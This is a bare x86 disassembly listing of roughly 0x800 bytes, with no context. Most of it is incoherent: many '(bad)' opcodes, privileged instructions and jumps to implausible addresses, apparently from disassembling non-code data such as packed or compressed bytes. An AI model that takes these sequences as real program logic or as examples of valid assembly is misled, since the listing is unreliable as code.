  429a2e:	sub    edx,DWORD PTR [ecx-0x76]
  429a31:	dec    ebp
  429a32:	add    DWORD PTR [ebx+0x88d845],ecx
  429a38:	mov    esi,DWORD PTR [ebx]
  429a3a:	or     BYTE PTR [ebx],al
  429a3c:	cmp    edx,DWORD PTR [ecx-0x38]
  429a3f:	dec    ebp
  429a40:	out    dx,eax
  429a41:	xor    eax,DWORD PTR [ebp+0x3]
  429a44:	mov    edx,DWORD PTR [ecx-0x28]
  429a47:	dec    ebp
  429a48:	add    BYTE PTR [ebx],dh
  429a4a:	push   0x518003
  429a4f:	push   eax
  429a50:	add    BYTE PTR [ebx-0x300748b],cl
  429a56:	sbb    BYTE PTR [ebp+0x45],cl
  429a59:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  429a5f:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  429a65:	dec    ebp
  429a66:	inc    ebp
  429a67:	xor    eax,esp
  429a69:	add    eax,esp
  429a6b:	push   ecx
  429a6c:	(bad)  
  429a6d:	dec    ebp
  429a6e:	mov    al,ds:0xc9e031ff
  429a73:	retf   
  429a74:	(bad)  
  429a75:	into   
  429a76:	sub    bh,bh
  429a78:	dec    esp
  429a79:	adc    al,0x9c
  429a7b:	inc    ebp
  429a7c:	push   ebp
  429a7d:	test   DWORD PTR [edi],ecx
  429a7f:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab6ff80]
  429a86:	jmp    0xc9bba99a
  429a8b:	add    cl,dl
  429a8d:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  429a97:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  429a9d:	rol    BYTE PTR [eax],0x57
  429aa0:	clc    
  429aa1:	bound  esi,QWORD PTR [edx+0x7]
  429aa4:	mov    eax,DWORD PTR [ebp-0x30]
  429aa7:	xor    al,0x40
  429aa9:	sub    al,0xc7
  429aab:	mov    ah,ch
  429aad:	add    DWORD PTR [ebp+0x4534f845],eax
  429ab3:	sub    al,0x86
  429ab5:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  429abc:	mov    ch,0xff
  429abe:	clc    
  429abf:	add    DWORD PTR [ebp+0x60],0x31
  429ac3:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  429aca:	inc    ebp
  429acb:	dec    DWORD PTR [ebx-0x341ff701]
  429ad1:	test   esi,ecx
  429ad3:	dec    DWORD PTR [ebx-0x7f8a3301]
  429ad9:	push   eax
  429ada:	add    DWORD PTR [ebp+0x0],eax
  429add:	dec    ebx
  429adf:	or     al,0xce
  429ae1:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  429ae8:	into   
  429ae9:	add    BYTE PTR [ebx-0x34ff1400],cl
  429aef:	mov    esi,ecx
  429af1:	sar    bh,0x45
  429af4:	adc    al,0x8b
  429af6:	clc    
  429af7:	fadd   DWORD PTR [ebp+0x0]
  429afa:	mov    ebp,DWORD PTR [edx+0x8]
  429afd:	push   edi
  429afe:	adc    BYTE PTR [eax+0x1],0x83
  429b02:	add    al,al
  429b04:	retf   
  429b05:	mov    ecx,esi
  429b07:	cld    
  429b08:	mov    eax,DWORD PTR [eax+0xcb01cc]
  429b0e:	into   
  429b0f:	add    BYTE PTR [ebx+0x756aec00],cl
  429b15:	jne    0x429b4a
  429b17:	inc    DWORD PTR [ebx]
  429b19:	rcl    BYTE PTR [ecx+0x50],1
  429b1c:	push   eax
  429b1d:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  429b23:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  429b2a:	sar    bh,0x84
  429b2d:	or     BYTE PTR [ebx],al
  429b2f:	push   eax
  429b30:	add    BYTE PTR [ebx+0x4532c845],cl
  429b36:	pushf  
  429b37:	xor    eax,0x89b49cc7
  429b3c:	test   eax,ebp
  429b3e:	clc    
  429b3f:	inc    ebp
  429b40:	inc    ebp
  429b41:	mov    DWORD PTR [eax+eax*8],esi
  429b44:	sub    al,0x34
  429b46:	mov    BYTE PTR [ebx+ecx*4+0x57d8ec89],bl
  429b4d:	dec    ebp
  429b4e:	bound  esi,QWORD PTR [ebx]
  429b50:	inc    edi
  429b51:	add    ecx,DWORD PTR [ebx+0x57f4b489]
  429b57:	dec    ebp
  429b58:	bound  esi,QWORD PTR [ebx]
  429b5a:	inc    edi
  429b5b:	add    eax,DWORD PTR [ebx-0xf7a377]
  429b61:	inc    ebp
  429b62:	add    ch,dl
  429b64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429b65:	pushf  
  429b66:	inc    edi
  429b68:	dec    esp
  429b6a:	lea    eax,[ebp+0x45fff860]
  429b70:	push   eax
  429b71:	xor    dh,BYTE PTR [ebp-0x64]
  429b74:	(bad)  
  429b75:	(bad)  
  429b76:	pop    esp
  429b77:	lods   al,BYTE PTR ds:[esi]
  429b78:	inc    DWORD PTR [ebp+0x4508f8ff]
  429b7e:	mov    esi,DWORD PTR [eax]
  429b80:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  429b87:	test   DWORD PTR [edi-0x8],edx
  429b8a:	inc    esi
  429b8b:	inc    ebp
  429b8c:	add    BYTE PTR [esi],bh
  429b8e:	push   0x8b809c
  429b93:	in     al,dx
  429b94:	inc    ebp
  429b95:	push   ebp
  429b96:	mov    esi,DWORD PTR [ebx]
  429b98:	cld    
  429b99:	add    eax,DWORD PTR [eax+0xf013b]
  429b9f:	adc    al,0x0
  429ba1:	add    bh,bh
  429ba3:	jmp    0xbf9cc0
  429ba8:	add    BYTE PTR [ebp+0x45],cl
  429bab:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  429bb1:	dec    ebp
  429bb2:	push   0x38033
  429bb7:	cmp    eax,DWORD PTR [eax]
  429bb9:	unpcklps xmm7,xmm0
  429bbc:	jne    0x429bbe
  429bbe:	dec    DWORD PTR [ebx+0x5545cc18]
  429bc4:	mov    DWORD PTR [ebx],esi
  429bc6:	shl    BYTE PTR [ebx],1
  429bc8:	inc    ebp
  429bc9:	add    ecx,DWORD PTR [ecx+0x60fc803]
  429bcf:	retf   0x5575
  429bd2:	dec    DWORD PTR [ebx-0x5ba17e8]
  429bd8:	(bad)  
  429bd9:	stc    
  429bda:	in     al,dx
  429bdb:	or     al,0x85
  429bdd:	dec    ebp
  429bde:	clc    
  429bdf:	xor    eax,DWORD PTR [ebp+0x3]
  429be2:	mov    ebp,ecx
  429be4:	rol    BYTE PTR [eax],1
  429be6:	inc    ebp
  429be7:	add    BYTE PTR [eax-0x7747ab3],bh
  429bed:	clc    
  429bee:	inc    ebp
  429bef:	retf   
  429bf0:	mov    edx,ebx
  429bf2:	in     al,dx
  429bf3:	(bad)  
  429bf4:	retf   
  429bf5:	into   
  429bf6:	into   
  429bf7:	scas   eax,DWORD PTR es:[edi]
  429bf8:	dec    ebp
  429bf9:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  429bff:	sub    ecx,esi
  429c01:	cmp    ecx,DWORD PTR [ebp+0x77]
  429c04:	(bad)  
  429c05:	mov    edi,eax
  429c07:	int3   
  429c08:	test   DWORD PTR [ecx-0x74baff08],ecx
  429c0e:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  429c15:	xor    eax,DWORD PTR [ebp+0x4503f803]
  429c1b:	rdtsc  
  429c1d:	retf   0x559c
  429c20:	(bad)  
  429c21:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  429c28:	inc    ebp
  429c29:	add    eax,0xeb9c4d3f
  429c2e:	(bad)  
  429c2f:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  429c35:	xor    ecx,DWORD PTR [ebp+0x33]
  429c38:	mov    eax,DWORD PTR [ebx]
  429c3a:	call   0xce526742
  429c3f:	retf   0x55d1
  429c42:	test   BYTE PTR [ebx-0x5ff17fe],cl
  429c48:	jmp    0x429c43
  429c4a:	add    BYTE PTR ds:0xebf44d8b,al
  429c50:	push   ebp
  429c51:	mov    ebp,DWORD PTR [ebx]
  429c53:	mov    eax,0x33f8558b
  429c58:	retf   
  429c59:	xor    ecx,esi
  429c5b:	add    edx,ecx
  429c5d:	add    eax,DWORD PTR [edx+0xca010f]
  429c63:	push   ebp
  429c64:	dec    ebp
  429c65:	mov    ecx,DWORD PTR [ebx-0x34050718]
  429c6b:	stc    
  429c6c:	rol    DWORD PTR ds:0xebce4dd6,cl
  429c72:	scas   eax,DWORD PTR es:[edi]
  429c73:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  429c79:	xor    ebp,DWORD PTR [ebx]
  429c7b:	xor    edi,DWORD PTR [ebx]
  429c7d:	add    esi,DWORD PTR [edi+0x3]
  429c80:	mov    ecx,DWORD PTR [edi]
  429c82:	clc    
  429c83:	retf   0x55cb
  429c86:	into   
  429c87:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  429c8e:	test   al,0x4d
  429c90:	push   ebp
  429c91:	jbe    0x429cc6
  429c93:	mov    esi,DWORD PTR [ebx]
  429c95:	mov    al,0x3
  429c97:	push   ebp
  429c98:	add    esi,DWORD PTR [ebx]
  429c9a:	rdpmc  
  429c9c:	retf   0x5503
  429c9f:	add    ecx,DWORD PTR [ebx-0x53517f1]
  429ca5:	dec    ebp
  429ca6:	stc    
  429ca7:	mov    ecx,DWORD PTR [eax]
  429ca9:	or     BYTE PTR [ebp+0x4d],cl
  429cac:	jmp    0x1369d3c
  429cb1:	dec    ebp
  429cb2:	dec    ebp
  429cb3:	(bad)  
  429cb4:	mov    ebx,esp
  429cb6:	clc    
  429cb7:	test   ebx,ecx
  429cb9:	clc    
  429cba:	ror    DWORD PTR [ebp-0x2a],cl
  429cbd:	mov    esi,ecx
  429cbf:	lock scas eax,DWORD PTR es:[edi]
  429cc1:	inc    ebp
  429cc2:	mov    esi,DWORD PTR [ebx]
  429cc4:	hlt    
  429cc5:	pushf  
  429cc6:	jge    0x429c53
  429cc8:	sub    ebx,esp
  429cca:	cmp    ecx,ebx
  429ccc:	ja     0x429c9c
  429cce:	mov    ebp,DWORD PTR [eax-0x58]
  429cd1:	dec    ebp
  429cd2:	xor    ecx,DWORD PTR [di+0x3]
  429cd6:	mov    esp,esp
  429cd8:	clc    
  429cd9:	push   ebp
  429cda:	retf   
  429cdb:	mov    dl,bl
  429cdd:	adc    esi,edx
  429cdf:	jb     0x429caf
  429ce1:	add    BYTE PTR [edi-0xb7474b3],ch
  429ce7:	lock jge 0x429cb5
  429cea:	sub    ecx,DWORD PTR [ebp+0x3b]
  429ced:	mov    esi,DWORD PTR [edi-0x20]
  429cf0:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459e]
  429cf7:	mov    BYTE PTR [ebx-0x34b20729],cl
  429cfd:	mov    edx,ebx
  429cff:	lock (bad) 
  429d01:	ror    esi,cl
  429d03:	push   ebp
  429d04:	scas   eax,DWORD PTR es:[edi]
  429d05:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  429d0b:	sahf   
  429d0c:	sub    esi,DWORD PTR [edx]
  429d0e:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  429d14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429d15:	xor    esp,DWORD PTR [ebx]
  429d17:	add    ecx,DWORD PTR [ebp-0x1c]
  429d1a:	mov    edi,DWORD PTR [ebp-0x8]
  429d1d:	mov    bl,cl
  429d1f:	cmp    dl,bl
  429d21:	jb     0x429cf1
  429d23:	add    dh,dl
  429d25:	dec    ebp
  429d26:	scas   eax,DWORD PTR es:[edi]
  429d27:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  429d2d:	shr    DWORD PTR [ebx],cl
  429d2f:	into   
  429d30:	cmp    edx,esi
  429d32:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  429d38:	dec    ebp
  429d39:	dec    ebp
  429d3a:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  429d40:	retf   
  429d41:	xor    edx,esi
  429d43:	add    ecx,esi
  429d45:	imul   ecx,edx
  429d48:	mov    DWORD PTR [ebp+0x8],edx
  429d4b:	xor    ecx,DWORD PTR [ebp+0x2b]
  429d4e:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  429d54:	add    esi,DWORD PTR [ebx]
  429d56:	rol    BYTE PTR [ebx],0x45
  429d59:	sysexit 
  429d5b:	xlat   BYTE PTR ds:[ebx]
  429d5c:	pushf  
  429d5d:	jge    0x429ce8
  429d5f:	xor    esp,eax
  429d61:	sub    eax,DWORD PTR [ebp-0x73]
  429d64:	(bad)  
  429d65:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  429d6c:	dec    ebp
  429d6d:	xchg   BYTE PTR [ebx],dh
  429d6f:	inc    DWORD PTR [ebx]
  429d71:	(bad)  
  429d72:	jmp    0x429dc1
  429d74:	mov    ecx,DWORD PTR [ebx-0x34341324]
  429d7a:	dec    ebp
  429d7b:	into   
  429d7c:	mov    ebp,DWORD PTR [edi-0x23737420]
  429d82:	sahf   
  429d83:	shl    DWORD PTR [edx],cl
  429d85:	retf   0x5588
  429d88:	or     ecx,DWORD PTR [ebp+0x7233114d]
  429d8e:	add    eax,DWORD PTR [eax]
  429d90:	in     al,0x4d
  429d92:	push   ebp
  429d93:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  429d99:	bound  eax,QWORD PTR [eax]
  429d9b:	int    0x4d
  429d9d:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  429da3:	dec    ebp
  429da4:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  429daa:	jge    0x429d7a
  429dac:	mov    BYTE PTR [edi+0xf723b3a],ch
  429db2:	add    cl,dh
  429db4:	dec    ebp
  429db5:	dec    DWORD PTR [ebx-0x2c032301]
  429dbb:	inc    ebp
  429dbc:	push   ebp
  429dbd:	dec    DWORD PTR [ebx-0x73ff1f34]
  429dc3:	lea    ebx,[esi-0x7400cdac]
  429dc9:	push   eax
  429dca:	mov    ah,0x45
  429dcc:	push   ebp
  429dcd:	mov    esi,DWORD PTR [ebx]
  429dcf:	les    esi,FWORD PTR [ebx]
  429dd1:	add    BYTE PTR [ebx],al
  429dd3:	inc    DWORD PTR [ebx]
  429dd5:	mov    ecx,DWORD PTR [edi]
  429dd7:	cld    
  429dd8:	retf   0x4d80
  429ddb:	add    DWORD PTR [ecx+0x4d30e400],ecx
  429de1:	jne    0x429d6e
  429de3:	(bad)  
  429de4:	in     al,dx
  429de5:	ror    bl,1
  429de7:	clc    
  429de8:	into   
  429de9:	add    BYTE PTR [edi-0xf2f7475],ch
  429def:	not    bl
  429df1:	adc    al,0xca
  429df3:	inc    ebp
  429df4:	push   ebp
  429df5:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  429dfb:	push   0xaf80d6
  429e00:	mov    eax,DWORD PTR [eax]
  429e02:	fdiv   st(7),st
  429e04:	sti    
  429e05:	sbb    dh,cl
  429e07:	pop    esi
  429e08:	xchg   esp,eax
  429e09:	leave  
  429e0a:	sahf   
  429e0b:	add    al,0x32
  429e0d:	push   ebp
  429e0e:	cmp    ebp,esp
  429e10:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  429e14:	dec    DWORD PTR [ecx-0x740f0375]
  429e1a:	push   ebp
  429e1b:	cld    
  429e1c:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  429e22:	retf   0x558b
  429e25:	clc    
  429e26:	xor    esi,eax
  429e28:	add    esi,DWORD PTR [ebp-0x75]
  429e2b:	(bad)  
  429e2c:	hlt    
  429e2d:	or     cl,BYTE PTR [esi+eax*8-0x39cdf762]
  429e34:	mov    DWORD PTR [edx],ecx
  429e36:	hlt    
  429e37:	(bad)  
  429e38:	dec    ebp
  429e39:	add    dh,BYTE PTR [ebx]
  429e3b:	leave  
  429e3c:	mov    edx,0xffec8d55
  429e41:	push   ecx
  429e42:	rol    DWORD PTR [ebp+0x55],1
  429e45:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  429e4b:	mov    eax,0xf8030b33
  429e50:	lar    ecx,di
  429e53:	push   ebp
  429e54:	retf   0x863b
  429e57:	jne    0x429e56
  429e59:	mov    edi,edi
  429e5b:	or     BYTE PTR [ebp+0x41],dh
  429e5e:	mov    esp,eax
  429e60:	cld    
  429e61:	inc    eax
  429e62:	mov    al,0x29
  429e64:	add    DWORD PTR [ecx+0x0],eax
  429e67:	loope  0x429dee
  429e69:	inc    ecx
  429e6a:	call   eax
  429e6c:	inc    edx
  429e6e:	mov    eax,DWORD PTR [eax]
  429e70:	cld    
  429e71:	mov    eax,DWORD PTR [eax+0x8d0151]
  429e77:	clc    
  429e78:	xor    BYTE PTR [ebp+0x45],al
  429e7b:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  429e81:	loopne 0x429e82
  429e83:	mov    edi,edi
  429e85:	mov    ecx,eax
  429e87:	clc    
  429e88:	jne    0x429e5a
  429e8a:	call   0x83af93
  429e8f:	sub    DWORD PTR [ebp+0x45],esi
  429e92:	test   esi,eax
  429e94:	je     0x429e97
  429e96:	mov    eax,esi
  429e98:	cld    
  429e99:	or     DWORD PTR [eax+0x401c9],eax
  429e9f:	push   ebp
  429ea0:	add    ah,ch
  429ea2:	add    BYTE PTR [ecx+0x6a],dl
  429ea5:	inc    ebp
  429ea6:	push   esi
  429ea7:	mov    DWORD PTR [eax-0x4],edx
  429eaa:	pop    edi
  429eab:	mov    ebx,DWORD PTR [ebx-0x4]
  429eae:	ret    0xbe
  429eb1:	push   es
  429eb2:	mov    ecx,DWORD PTR [ecx-0x77274af]
  429eb8:	clc    
  429eb9:	lock inc ebp
  429ebb:	jne    0x429f13
  429ebd:	(bad)  
  429ebe:	jne    0x429ec4
  429ec0:	mov    eax,0xf841ba66
  429ec5:	rol    BYTE PTR [esi],1
  429ec7:	(bad)  
  429ec8:	jne    0x429efb
  429eca:	cmp    eax,ebx
  429ecc:	pop    esi
  429ecd:	mov    ecx,DWORD PTR [eax]
  429ecf:	push   ecx
  429ed0:	inc    ecx
  429ed1:	lea    edi,[eax+edi*8+0x42]
  429ed5:	inc    ebp
  429ed6:	ror    DWORD PTR [ebx-0x408303be],0x41
  429edd:	xchg   edx,ebp
  429edf:	mov    ebx,eax
  429ee1:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  429ee7:	or     edi,eax
  429ee9:	inc    ebp
  429eea:	inc    ebp
  429eeb:	(bad)  
  429eec:	mov    ecx,DWORD PTR [eax]
  429eee:	cld    
  429eef:	(bad)  
  429ef0:	jmp    0x429ef3
  429ef2:	mov    eax,esi
  429ef4:	mov    DWORD PTR ds:0x4f8c98b,eax
  429efa:	rcl    BYTE PTR [esi+0xf],1
  429efd:	iret   
  429efe:	inc    ebp
  429eff:	leave  
  429f00:	(bad)  
  429f01:	dec    DWORD PTR [ecx]
  429f03:	mov    eax,esi
  429f05:	mov    eax,DWORD PTR [edi]
  429f07:	mov    dh,0xd1
  429f0a:	push   es
  429f0b:	nop
  429f0c:	(bad)  
  429f0d:	inc    DWORD PTR [ebx]
  429f0f:	push   esi
  429f10:	leave  
  429f11:	iret   
  429f12:	add    al,0x46
  429f14:	push   ebp
  429f15:	in     eax,0xec
  429f17:	push   ebp
  429f18:	push   ecx
  429f19:	inc    DWORD PTR [ebp+0x56]
  429f1c:	mov    DWORD PTR [esi-0x4],eax
  429f1f:	loope  0x429f76
  429f21:	sbb    BYTE PTR [eax+0x7c6daff],bh
  429f27:	add    al,BYTE PTR [edx]
  429f29:	mov    edx,DWORD PTR [ebp-0x17]
  429f2c:	cmp    edi,esi
  429f2e:	jne    0x429f2f
  429f30:	(bad)  
  429f31:	push   esi
  429f32:	pop    es
  429f33:	push   ebp
  429f34:	mov    ebp,esp
  429f36:	or     BYTE PTR [ebp+0x41],al
  429f39:	add    edi,edx
  429f3b:	sub    BYTE PTR [eax-0x4],al
  429f3e:	shl    BYTE PTR [ebp-0x3e],0x1
  429f42:	add    BYTE PTR [ebx+ecx*4],bl
  429f45:	mov    edx,DWORD PTR [ecx+0x14]
  429f48:	lea    edx,[edx-0x1ba7508]
  429f4e:	push   esi
  429f4f:	enter  0xd375,0xb8
  429f53:	test   DWORD PTR [esi],0x6ce0750
  429f59:	enter  0xd375,0x3b
  429f5d:	neg    DWORD PTR [esi+0x50]
  429f60:	or     cl,dl
  429f62:	inc    edx
  429f63:	(bad)  
  429f64:	in     eax,dx
  429f65:	in     al,dx
  429f66:	(bad)  
  429f67:	sub    eax,DWORD PTR [ebx]
  429f69:	inc    eax
  429f6a:	in     eax,dx
  429f6b:	push   eax
  429f6c:	add    dl,BYTE PTR [eax-0x37]
  429f6f:	push   edi
  429f70:	push   ebp
  429f71:	imul   ah
  429f73:	adc    DWORD PTR [ecx-0x1],0x45
  429f77:	add    BYTE PTR [ecx+0x55d3fc00],cl
  429f7d:	lea    edi,[eax-0x7fff4ca]
  429f83:	mov    eax,0x4550402
  429f88:	cmp    ebp,ecx
  429f8a:	jne    0x429f37
  429f8c:	mov    eax,DWORD PTR ds:0x241e808
  429f92:	loope  0x429f94
  429f94:	inc    eax
  429f95:	stc    
  429f96:	xlat   BYTE PTR ds:[ebx]
  429f97:	ss inc ecx
  429f99:	aas    
  429f9a:	in     eax,0x7d
  429f9c:	ret    0x8b
  429f9f:	lock mov edi,DWORD PTR [ebp-0x18]
  429fa3:	and    edi,edi
  429fa5:	mov    edi,edi
  429fa7:	call   0xe410a083
  429fac:	push   es
  429fad:	add    al,ch
  429faf:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  429fb6:	(bad)  
  429fb7:	hlt    
  429fb8:	add    eax,0xffd3e87d
  429fbd:	cmp    bh,0x8
  429fc0:	(bad)  
  429fc1:	fld    DWORD PTR [esi]
  429fc3:	out    dx,al
  429fc4:	call   0xffa19ecc
  429fc9:	cmp    al,0x46
  429fcb:	shr    edx,0x8
  429fce:	(bad)  
  429fcf:	pop    es
  429fd0:	fisttp QWORD PTR [ebp+0xe577eff]
  429fd6:	push   ebx
  429fd7:	add    BYTE PTR [ebx+0x24008b56],cl
  429fdd:	add    BYTE PTR [ebp+0x50],al
  429fe0:	push   eax
  429fe1:	add    DWORD PTR [ebx+0x757d1834],ecx
  429fe7:	sub    edx,DWORD PTR [esi-0x24]
  429fea:	jne    0x429fa2
  429fec:	lods   eax,DWORD PTR ds:[esi]
  429fed:	mov    edx,DWORD PTR [edx-0x34]
  429ff0:	dec    esi
  429ff1:	out    0x83,eax
  429ff3:	into   
  429ff4:	push   edi
  429ff6:	loopne 0x429fc6
  429ff8:	shr    BYTE PTR [edx+ecx*4+0x0],1
  429ffc:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  42a003:	rol    DWORD PTR [edx],0x8
  42a006:	mov    esp,ecx
  42a008:	cmp    DWORD PTR [ebx],0xc
  42a00b:	mov    esi,0x5001c0
  42a010:	push   eax
  42a011:	push   cs
  42a012:	push   eax
  42a013:	(bad)  
  42a014:	sub    edx,edi
  42a016:	push   esi
  42a017:	adc    al,0xcb
  42a019:	ins    DWORD PTR es:[edi],dx
  42a01a:	mov    eax,0x203e8
  42a01f:	add    al,ah
  42a021:	inc    esi
  42a022:	mov    al,ch
  42a024:	pop    es
  42a025:	add    DWORD PTR [eax],0x1
  42a028:	add    dh,al
  42a02a:	add    ah,ch
  42a02c:	rol    DWORD PTR [edx-0xd],1
  42a02f:	cli    
  42a030:	push   0x4a
  42a032:	pop    ecx
  42a033:	retf   0xfe6
  42a036:	add    BYTE PTR [ebx-0x4e72f41e],al
  42a03c:	(bad)  
  42a03d:	dec    BYTE PTR [ebx+0x45b1fc72]
  42a043:	(bad)  
  42a044:	sub    ebp,DWORD PTR [ebx]
  42a046:	and    al,0x52
  42a048:	(bad)  
  42a049:	dec    edi
  42a04a:	inc    ebp
  42a04b:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  42a052:	add    BYTE PTR [ebp-0x7b],dh
  42a055:	pop    eax
  42a056:	add    BYTE PTR [edx+0x0],bl
  42a059:	pop    edx
  42a05a:	dec    ebp
  42a05b:	jmp    DWORD PTR [ebx]
  42a05d:	and    al,0xec
  42a05f:	push   edx
  42a060:	out    0x64,eax
  42a062:	jmp    0xd3f49667
  42a067:	jmp    0x42a0c1
  42a069:	mov    al,0xfe
  42a06b:	dec    BYTE PTR [ebp-0x18fd8018]
  42a071:	add    BYTE PTR [esi+ebp*1],bh
  42a074:	pop    edx
  42a075:	icebp  
  42a076:	mov    eax,cs
  42a078:	ins    BYTE PTR es:[edi],dx
  42a079:	adc    eax,0x75510000
  42a07e:	mov    esi,0x70158
  42a083:	or     DWORD PTR [eax-0x74f48dfe],esi
  42a089:	mov    edi,esp
  42a08b:	cld    
  42a08c:	jge    0x42a103
  42a08e:	(bad)  
  42a090:	aas    
  42a091:	and    al,0x6d
  42a093:	adc    cl,0x1
  42a096:	mov    eax,DWORD PTR [eax]
  42a098:	and    ecx,DWORD PTR [ebx-0x167203fd]
  42a09e:	dec    ebp
  42a09f:	add    eax,ebp
  42a0a1:	add    BYTE PTR [edx],al
  42a0a3:	fadd   DWORD PTR [eax]
  42a0a5:	stc    
  42a0a6:	enter  0xee00,0x8b
  42a0aa:	sbb    eax,0x1
  42a0ad:	sbb    esi,ecx
  42a0af:	in     al,0x0
  42a0b1:	in     eax,dx
  42a0b2:	add    BYTE PTR [eax],al
  42a0b4:	jne    0x42a041
  42a0b6:	cmp    edx,esp
  42a0b8:	jb     0x42a0c3
  42a0ba:	jmp    0x42a131
  42a0bc:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  42a0c2:	add    BYTE PTR [ebx+0x4d83d840],cl
  42a0c8:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  42a0ce:	jb     0x42a059
  42a0d0:	pop    edx
  42a0d1:	fadd   QWORD PTR [ebx-0x7445faa1]
  42a0d7:	or     dh,BYTE PTR [edx+0x0]
  42a0da:	inc    edx
  42a0db:	or     dl,bh
  42a0dd:	xlat   BYTE PTR ds:[ebx]
  42a0de:	dec    edx
  42a0df:	push   edi
  42a0e0:	add    al,0x7
  42a0e2:	leave  
  42a0e3:	rol    DWORD PTR [edx+eax*1],0x7
  42a0e7:	add    ecx,ecx
  42a0e9:	mov    edx,ecx
  42a0eb:	int3   
  42a0ec:	jmp    0x42a0ac
  42a0ee:	mov    al,0x0
  42a0f0:	(bad)  
  42a0f1:	jne    0x42a0db
  42a0f3:	mov    eax,DWORD PTR [edx]
  42a0f5:	call   0xc1571dfa
  42a0fa:	pop    edi
  42a0fb:	add    ebx,DWORD PTR [ecx-0x37]
  42a0fe:	pop    ecx
  42a0ff:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  42a106:	push   es
  42a107:	mov    eax,DWORD PTR [eax]
  42a109:	int3   
  42a10a:	add    ch,al
  42a10c:	jae    0x42a0f6
  42a10e:	int    0x1
  42a110:	enter  0x3000,0x18
  42a114:	add    BYTE PTR [ebp+0x75],al
  42a117:	mov    esi,DWORD PTR [eax-0x171f0134]
  42a11d:	push   0x2
  42a11f:	pop    ecx
  42a120:	add    BYTE PTR [eax],cl
  42a122:	push   ebx
  42a123:	lea    edi,[edi+eax*2]
  42a126:	mov    al,0x1
  42a128:	jb     0x42a12a
  42a12a:	mov    al,0x10
  42a12c:	push   eax
  42a12d:	add    al,0x75
  42a12f:	add    BYTE PTR [ebx],ch
  42a131:	add    ebx,esp
  42a133:	int3   
  42a134:	jne    0x42a146
  42a136:	movsx  edx,cl
  42a139:	add    DWORD PTR [eax],eax
  42a13b:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  42a142:	mov    gs,edi
  42a144:	add    BYTE PTR [eax-0x50],ch
  42a147:	add    al,ch
  42a149:	mov    eax,DWORD PTR [ecx]
  42a14b:	sub    eax,DWORD PTR [eax]
  42a14d:	jb     0x42a1c4
  42a14f:	add    DWORD PTR [esp+eiz*8-0x50],esi
  42a153:	jge    0x42a13d
  42a155:	add    al,0x1
  42a157:	add    DWORD PTR [eax],0x0
  42a15a:	jne    0x42a15c
  42a15c:	je     0x42a1a3
  42a15e:	mov    eax,DWORD PTR [edi]
  42a160:	ror    BYTE PTR [ebp+0x4d],1
  42a163:	or     DWORD PTR [ecx+0x4d03d004],0x3
  42a16a:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  42a170:	mov    DWORD PTR [ebx],ebp
  42a172:	fadd   DWORD PTR [eax+0x75]
  42a175:	inc    eax
  42a176:	pop    eax
  42a177:	lea    ebx,[ecx+0x4f]
  42a17a:	push   0xb1000003
  42a17f:	out    dx,eax
  42a180:	add    ebp,DWORD PTR [edx+edx*2]
  42a183:	add    BYTE PTR [ebx+ecx*4],bh
  42a186:	mov    ch,BYTE PTR [ebx]
  42a188:	jb     0x42a1fc
  42a18a:	add    al,0x89
  42a18c:	push   eax
  42a18d:	call   0x842aeeff
  42a192:	add    DWORD PTR [eax+eax*1],eax
  42a195:	jae    0x42a1ab
  42a197:	icebp  
  42a198:	inc    ebp
  42a199:	mov    eax,DWORD PTR gs:[ecx]
  42a19c:	int3   
  42a19d:	out    dx,al
  42a19e:	loopne 0x42a1ed
  42a1a0:	sub    eax,DWORD PTR [edx]
  42a1a2:	push   0xffffff83
  42a1a4:	pop    esi
  42a1a5:	push   cs
  42a1a6:	jl     0x42a1c1
  42a1a8:	add    al,0xaf
  42a1aa:	xor    eax,0x832b6d00
  42a1af:	mov    eax,DWORD PTR [edx]
  42a1b1:	rcr    BYTE PTR [ebp+0x754500dc],cl
  42a1b7:	ror    DWORD PTR [ebx+0x7dc8e803],1
  42a1bd:	inc    ebp
  42a1be:	shr    ebx,0x3
  42a1c1:	or     DWORD PTR [eax],0x4
  42a1c4:	push   0xffffffa5
  42a1c6:	pop    esi
